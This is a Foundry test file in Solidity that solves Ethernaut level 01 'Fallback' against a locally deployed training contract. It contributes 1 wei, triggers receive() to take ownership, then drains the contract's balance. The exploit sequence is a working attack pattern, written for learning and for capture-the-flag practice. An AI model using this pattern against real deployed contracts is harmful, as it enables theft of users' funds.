// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Fallback} from "../src/01_Fallback.sol";
import {Test} from "forge-std/Test.sol";

/// @title Ethernaut 01 - Fallback Exploit Test
/// @notice Verifies that a contributor can seize ownership through receive and withdraw the balance.
contract FallbackTest is Test {
    /// @notice Account used to execute the exploit.
    address attacker = makeAddr("attacker");

    /// @notice Vulnerable target contract.
    Fallback fallback_contract;

    /// @notice Funds the attacker and deploys a fresh target before each test.
    function setUp() public {
        vm.deal(attacker, 1 ether);
        fallback_contract = new Fallback();
    }

    /// @notice Reproduces the complete Fallback level exploit.
    function testExploit() public {
        vm.startPrank(attacker);

        // 1. Make a minimal contribution to satisfy receive's contribution check.
        fallback_contract.contribute{value: 1 wei}();
        assertEq(fallback_contract.getContribution(), 1 wei);

        // 2. Send ETH with empty calldata to trigger receive.
        (bool success,) = address(fallback_contract).call{value: 1 wei}("");
        require(success, "ETH send fail");

        // 3. Verify that receive assigned ownership to the attacker.
        assertEq(fallback_contract.owner(), attacker);

        // 4. Use the stolen owner privilege to withdraw the entire balance.
        fallback_contract.withdraw();

        // 5. Confirm that the contract was fully drained.
        assertEq(address(fallback_contract).balance, 0);

        vm.stopPrank();
    }
}
